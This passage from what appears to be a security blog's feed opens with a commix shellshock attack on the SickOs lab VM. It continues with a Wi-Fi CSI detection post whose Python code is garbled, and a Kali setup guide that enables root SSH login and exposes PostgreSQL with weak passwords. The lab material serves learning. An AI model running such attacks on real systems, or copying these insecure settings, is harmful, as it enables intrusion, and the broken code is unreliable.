SickOs 1.1 using shellshock module and HTTP proxy:"></a>14. Exploiting <a href="https://www.vulnhub.com/entry/sickos-11,132/" target="_blank" rel="noopener">SickOs 1.1</a> using shellshock module and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-Exploiting-Damn-Vulnerable-Web-App&quot;&gt;&lt;a href=&quot;#1-Exploiting-Damn-Vulnerable-Web-App&quot; class=&quot;headerlink&quot; title=&quot;1. Exploiting Damn V
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于CSI的移动目标侦测研究学习</title>
    <link href="http://zer0yu.github.io/2017/01/21/%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://zer0yu.github.io/2017/01/21/基于CSI的移动目标侦测研究学习/</id>
    <published>2017-01-21T14:48:58.000Z</published>
    <updated>2017-01-23T03:12:15.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h4><p>需要用到<a href="http://dhalperi.github.io/linux-80211n-csitool/" target="_blank" rel="noopener">CSI tool</a>，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载<a href="http://pan.baidu.com/s/1dDhFuNJ" target="_blank" rel="noopener">清华的版本</a>。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。</p><p>需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。</p><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./log_to_file tmp.dat</span><br></pre></td></tr></table></figure><p>打开另一个终端，运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.1.1 -i 0.2</span><br></pre></td></tr></table></figure><p>netlink文件夹中的tmp.dat就是采集的原始数据。</p><h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。</p><p>一个例子数据包里包含</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">timestamp_low: <span class="number">4</span> (In the sample trace, timestamp_low is invalid and always <span class="number">4.</span>)</span><br><span class="line">bfee_count: <span class="number">72</span></span><br><span class="line">Nrx: <span class="number">3</span></span><br><span class="line">Ntx: <span class="number">1</span></span><br><span class="line">rssi_a: <span class="number">33</span></span><br><span class="line">rssi_b: <span class="number">37</span></span><br><span class="line">rssi_c: <span class="number">41</span></span><br><span class="line">noise: <span class="number">-127</span></span><br><span class="line">agc: <span class="number">38</span></span><br><span class="line">perm: [<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line">rate: <span class="number">256</span></span><br><span class="line">csi: [<span class="number">1</span>x3x30 double]</span><br></pre></td></tr></table></figure><ul><li><strong>timestamp_low</strong> 是时间戳</li><li><strong>bfee_count</strong> 数据包数量</li><li><strong>Nrx,Ntx</strong> 分别表示接收端和发送端的天线数量</li><li><strong>rssi_a, rssi_b, rssi_c</strong> 每个天线的RSSI数据，单位dB，</li><li><strong>agc</strong> Automatic Gain Control</li><li><strong>perm</strong> NIC重排列后的顺序结果，代表RF链路的顺序</li><li><strong>rate</strong> 发送包的rate</li><li><strong>csi</strong> CSI原始数据，是个Ntx×Nrx×30复数矩阵</li></ul><p>主要提取出CSI数据和timestamp_low。</p><h4 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h4><p>为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">N = <span class="number">1000</span> <span class="comment"># N为采集的数据包数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">complexDecoding</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">“””</span><br><span class="line">将原始数据转化为Python可识别的复数</span><br><span class="line">这里使用了第一个天线的数据raw_data[<span class="number">0</span>]</span><br><span class="line">第二根第三根天线数据下标分别为<span class="number">1</span>, <span class="number">2</span></span><br><span class="line">原始数据为a + bi, python为a + bj</span><br><span class="line">返回处理后的数据</span><br><span class="line">“””</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(N):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment"># 30 代表子载波数量，固定为30</span></span><br><span class="line"><span class="keyword">if</span> raw_data[<span class="number">0</span>][<span class="number">-1</span>] == ‘i’:</span><br><span class="line">data.append(complex(raw_data[<span class="number">0</span>][:<span class="number">-1</span>]+‘j’))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data.append(complex(raw_data[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAP</span><span class="params">(data)</span>:</span></span><br><span class="line">“””</span><br><span class="line">根据复数计算振幅和相位</span><br><span class="line">“””</span><br><span class="line">amplitudes = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</span><br><span class="line">phases = [([] * <span class="number">30</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">r = sqrt((data[i + m * <span class="number">30</span>].real) ** <span class="number">2</span> + (data[i + m * <span class="number">30</span>].imag) ** <span class="number">2</span>)</span><br><span class="line">amplitudes[m].append(r)</span><br><span class="line">phases[m].append(np.angle(data[i + m * <span class="number">30</span>]))</span><br><span class="line"><span class="keyword">return</span> (amplitudes, phases)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocessingPhase</span><span class="params">(phases)</span>:</span></span><br><span class="line">“””</span><br><span class="line">将相位进行线性变换</span><br><span class="line">index是 <span class="number">-28</span> 到 <span class="number">28</span> 根据 IEEE <span class="number">802.11</span>n 协议</span><br><span class="line">返回变换后的相位</span><br><span class="line">“””</span><br><span class="line">index = range(<span class="number">-28</span>,<span class="number">0</span>,<span class="number">2</span>) + [<span class="number">-1</span>, <span class="number">1</span>] + range(<span class="number">3</span>,<span class="number">28</span>, <span class="number">2</span>) + [<span class="number">28</span>]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(N):</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">clear = <span class="literal">True</span></span><br><span class="line">base = <span class="number">0</span></span><br><span class="line">tphases[m][<span class="number">0</span>] = phases[m][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line"><span class="keyword">if</span> phases[m][i] – phases[m][i<span class="number">-1</span>] &gt; pi:</span><br><span class="line">base += <span class="number">1</span></span><br><span class="line">clear = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> phases[m][i] – phases[m][i<span class="number">-1</span>] &lt; -pi:</span><br><span class="line">base –= <span class="number">1</span></span><br><span class="line">clear = <span class="literal">False</span></span><br><span class="line">tphases[m][i] = phases[m][i] – <span class="number">2</span> * pi * base</span><br><span class="line"><span class="keyword">if</span> clear == <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">phases[m][i] = tphases[m][i] – (tphases[m][<span class="number">29</span>] – tphases[m][<span class="number">0</span>])</span><br><span class="line">* <span class="number">1.0</span> /(<span class="number">28</span> – (<span class="number">-28</span>)) * (index[i])</span><br><span class="line">– <span class="number">1.0</span> / <span class="number">30</span> * sum([tphases[m][j] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>)])</span><br><span class="line"><span class="keyword">return</span> phases</span><br></pre></td></tr></table></figure><h4 id="参考论文"><a href="#参考论文" class="headerlink" title="参考论文"></a>参考论文</h4><ol><li>PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;#环境安装&quot; class=&quot;headerlink&quot; title=&quot;环境安装&quot;&gt;&lt;/a&gt;环境安装&lt;/h4&gt;&lt;p&gt;需要用到&lt;a href=&quot;http://dhalperi.github.io/linux-80211n-csitool/&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali linux 2016 使用指南(二)</title>
    <link href="http://zer0yu.github.io/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C/"/>
    <id>http://zer0yu.github.io/2017/01/21/kali-linux-2016-使用指南-二/</id>
    <published>2017-01-21T14:11:00.000Z</published>
    <updated>2018-05-13T14:03:59.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="虚拟机安装增强"><a href="#虚拟机安装增强" class="headerlink" title="虚拟机安装增强"></a>虚拟机安装增强</h4><h5 id="1-Kali-官方安装"><a href="#1-Kali-官方安装" class="headerlink" title="1.Kali 官方安装"></a>1.Kali 官方安装</h5><p>更新 /etc/apt/sources.list</p><p>你所添加的源，请确保是我在一中写的所有</p><p>然后在线安装增强功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y virtualbox-guest-x11</span><br><span class="line"></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h5 id="2-VirtualBox自带包安装"><a href="#2-VirtualBox自带包安装" class="headerlink" title="2.VirtualBox自带包安装"></a>2.VirtualBox自带包安装</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y linux-headers-$(uname-r)</span><br><span class="line"></span><br><span class="line">cp /media/cd-rom/VBoxLinuxAdditions.run /root/</span><br><span class="line"></span><br><span class="line">chmod 755 /root/VBoxLinuxAdditions.run</span><br><span class="line"></span><br><span class="line">cd/root</span><br><span class="line"></span><br><span class="line">./VBoxLinuxAdditions.run</span><br></pre></td></tr></table></figure><h4 id="内核头有问题自己手动安装过程"><a href="#内核头有问题自己手动安装过程" class="headerlink" title="内核头有问题自己手动安装过程"></a>内核头有问题自己手动安装过程</h4><p>打开 <a href="http://http.kali.org/kali/pool/main/l/linux/%20" target="_blank" rel="noopener">http://http.kali.org/kali/pool/main/l/linux/</a></p><p>下载对应自己内核版本的 linux-kbuild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget http://http.kali.org/kali/pool/main/l/linux/linux-kbuild-4.6_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i linux-kbuild-4.6_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">wget http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">wget http://http.kali.org/kali/pool/main/l/linux/http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.deb</span><br><span class="line"></span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><h4 id="开启SSH服务"><a href="#开启SSH服务" class="headerlink" title="开启SSH服务"></a>开启SSH服务</h4><p>首先：编辑sshd_config文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>其次：将sshd_config文件中的语句PermitRootLogin prohibit-password修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure><p>再次：使用命令启动SSH服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br><span class="line"># 或者</span><br><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p>最后：设置系统开机自动启动SSH服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable  //系统自动启动SSH服务</span><br></pre></td></tr></table></figure><h4 id="mysql重置密码"><a href="#mysql重置密码" class="headerlink" title="mysql重置密码"></a>mysql重置密码</h4><p>1、如果<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">Linux</a>中未安装<a href="http://lib.csdn.net/base/mysql" target="_blank" rel="noopener">MySQL</a>，则需要下载安装，<strong>在安装的过程中会要求输入用户名密码</strong>，则无需重置，直接设置</p><p>2、MySQL设置UTF-8编码格式**</p><p>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vim /etc/mysql/my.cnf</span><br></pre></td></tr></table></figure><p>添加默认utf-8编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line">default-character-set = utf8</span><br><span class="line">[mysqld]</span><br><span class="line">default-storage-engine = INNODB</span><br><span class="line">character-set-server = utf8</span><br><span class="line">collation-server = utf8_general_ci</span><br></pre></td></tr></table></figure><p>3、更新MySQL的用户名密码</p><p>首先查看MySQL是否运行，确保MySQL是stop状态，可以使用/etc/init.d/mysql stop停止运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/mysql status</span><br><span class="line">[info] MySQL is stopped..</span><br></pre></td></tr></table></figure><p>然后启动MySQL的server/daemon process</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysqld_safe –skip-grant-tables &amp;</span><br></pre></td></tr></table></figure><p>使用root用户连接MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysql -u root</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.5.44–0+deb7u1 (Debian)</span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line">Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>更改root用户的密码为admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; update user set password=PASSWORD(‘admin’) where User=‘root’;</span><br><span class="line">Query OK, 4 rows affected (0.01 sec)</span><br><span class="line">Rows matched: 4  Changed: 4  Warnings: 0</span><br></pre></td></tr></table></figure><p>执行更新命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>flush privileges 命令本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效。而不必冒太大风险。</p><p>退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; quit</span><br></pre></td></tr></table></figure><p>4、验证用户密码是否更新成功</p><p>重启MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# /etc/init.d/mysql restart</span><br><span class="line">[ ok ] Stopping MySQL database server: mysqld.</span><br><span class="line">[….] Starting MySQL database server: mysqld151015 11:41:36 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended</span><br><span class="line">[ .k</span><br><span class="line">[info] Checking for tables which need an upgrade, are corrupt or were</span><br><span class="line">not closed cleanly..</span><br><span class="line">[1]+  完成                  mysqld_safe –skip-grant-tables</span><br></pre></td></tr></table></figure><p>使用root用户连接MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mysql -u root -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 43</span><br><span class="line">Server version: 5.5.44–0+deb7u1 (Debian)</span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line">Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h4 id="metasploit-Database-not-connect问题解决"><a href="#metasploit-Database-not-connect问题解决" class="headerlink" title="metasploit Database not connect问题解决"></a>metasploit Database not connect问题解决</h4><p>1、postgresql是本身没有启动的。所以需要启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure><p>2、通过命令进入配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql</span><br><span class="line">ALTER USER postgres WITH PASSWORD ‘123.com’;</span><br></pre></td></tr></table></figure><p>注意1：‘123.com’这个是密码。<br>注意2：分号！！！！一定要带上分号“；”。<br>注意3：\q：退出数据库</p><p>3、修改linux系统的postgres用户的密码（密码与数据库用户postgres的密码相同）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sudo passwd -d postgres</span><br><span class="line">passwd：密码过期信息已更改。</span><br><span class="line">root@kali:~# sudo -u postgres passwd</span><br><span class="line">输入新的 UNIX 密码：</span><br><span class="line">重新输入新的 UNIX 密码：</span><br><span class="line">passwd：已成功更新密码</span><br></pre></td></tr></table></figure><p>4、修改PostgresSQL数据库配置实现远程访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# vi /etc/postgresql/9.4/main/postgresql.conf</span><br><span class="line">更改#listen_addresses = ‘localhost’为 listen_addresses = ‘*’</span><br><span class="line">更改#password_encryption = on为password_encryption = on</span><br><span class="line">root@kali:~# vi /etc/postgresql/9.4/main/pg_hba.conf</span><br><span class="line">在文档末尾加上以下内容</span><br><span class="line"># to allow your client visiting postgresql server</span><br><span class="line">host all all 0.0.0.0 0.0.0.0 md5</span><br><span class="line">root@kali:~# service postgresql restart</span><br></pre></td></tr></table></figure><p>注意1：“#”号，一定要把“#”删除掉。<br>注意2：在vi编辑模式下点击键盘字母a是进入编辑模式，编辑完成后点击“esc”退出编辑模式然后在最下方输入“：wq”保存并退出。</p><p>5、管理PostgreSQL用户和数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# psql -U postgres -h 127.0.0.1</span><br></pre></td></tr></table></figure><p>用户 postgres 的口令：<br>psql (9.4.6)<br>SSL连接 (协议: TLSv1.2, 加密：ECDHE-RSA-AES256-GCM-SHA384，二进制位: 256, 压缩比: 关闭)<br>输入 “help” 来获取帮助信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">postgres=# create user “msf123” with password ‘123456’ nocreatedb;</span><br><span class="line">CREATE ROLE</span><br><span class="line">postgres=# create database “msf1” with owner=”msf123”;</span><br><span class="line">ERROR: role “”msf123”” does not exist</span><br><span class="line">postgres=# create database “msf1″ with owner=”msf123”;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# \q</span><br></pre></td></tr></table></figure><p>注意1：还是要注意分号！！！没有分号命令就无法执行。<br>注意2：注意复制的时候“”符号问题。<br>注意3：user后面是用户名，password后面是用户名对应的密码。<br>注意4：命令执行后有返回结果才是执行成功了。</p><p>6、msf配置连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql selected, no connection</span><br><span class="line">msf &gt; db_connect msf123:123456@127.0.0.1/msf1</span><br><span class="line">[*] Rebuilding the module cache in the background…</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf1</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure><p>在msf启动后连接数据库就好。<br>注意1：“msf123:123456”这个是步骤5中的<br>“create user “msf123” with password ‘123456’ nocreatedb;”所建立的。<br>“127.0.0.1”是指本机。<br>“msf1”这个是库名。<br>注意2：“[*] postgresql connected to msf1”这个是说明以链接成功数据库。</p><h4 id="kali-linux-apt-get-证书校验错误"><a href="#kali-linux-apt-get-证书校验错误" class="headerlink" title="kali linux apt-get 证书校验错误"></a>kali linux apt-get 证书校验错误</h4><p>错误信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@teamserver:~# apt-get update</span><br><span class="line">Get:1 http://mirror.neostrada.nl/kali kali-rolling InRelease [30.5 kB]</span><br><span class="line">Err:1 http://mirror.neostrada.nl/kali kali-rolling InRelease</span><br><span class="line">  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">Fetched 30.5 kB in 1s (25.5 kB/s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://mirror.neostrada.nl/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br></pre></td></tr></table></figure><p>Kali 证书链过期 重新下载新的证书链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O - archive.kali.org/archive-key.asc | apt-key add</span><br></pre></td></tr></table></figure><p>####安装32位运行库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install lib32z1 lib32ncurses5</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;虚拟机安装增强&quot;&gt;&lt;a href=&quot;#虚拟机安装增强&quot; class=&quot;headerlink&quot; title=&quot;虚拟机安装增强&quot;&gt;&lt;/a&gt;虚拟机安装增强&lt;/h4&gt;&lt;h5 id=&quot;1-Kali-官方安装&quot;&gt;&lt;a href=&quot;#1-Kali-官方安装&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali linux 2016 使用指南(一)</title>
    <link href="http://zer0yu.github.io/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80/"/>
    <id>http://zer0yu.github.io/2017/01/21/kali-linux-2016-使用指南-一/</id>
    <published>2017-01-21T14:10:21.000Z</published>
    <updated>2017-01-21T14:35:18.000Z</updated>
    
